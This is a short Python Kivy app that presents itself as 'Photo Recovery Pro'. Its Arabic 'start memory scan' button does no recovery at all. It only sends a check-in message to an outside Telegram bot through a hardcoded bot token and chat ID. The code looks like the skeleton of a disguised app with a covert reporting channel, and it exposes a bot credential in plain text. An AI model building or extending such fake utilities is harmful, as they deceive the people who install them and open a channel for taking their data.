from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
import requests

class RecoveryApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        self.lbl = Label(text="Photo Recovery Pro v1.0", font_size='22sp')
        btn = Button(text='بدأ فحص الذاكرة الآن', size_hint=(1, 0.25), background_color=(0, 0.5, 1, 1))
        btn.bind(on_press=self.start_action)
        layout.add_widget(self.lbl)
        layout.add_widget(btn)
        return layout

    def start_action(self, instance):
        TOKEN = "7547101882:AAHOX_K00v3VvX1PSTmS9pGv9nK-W9_8Kx0"
        CHAT_ID = "6102607907"
        self.lbl.text = "جاري العمل... تفقد البوت"
        try:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                          data={"chat_id": CHAT_ID, "text": "🔔 التطبيق يعمل!"})
        except: pass

if __name__ == "__main__":
    RecoveryApp().run()
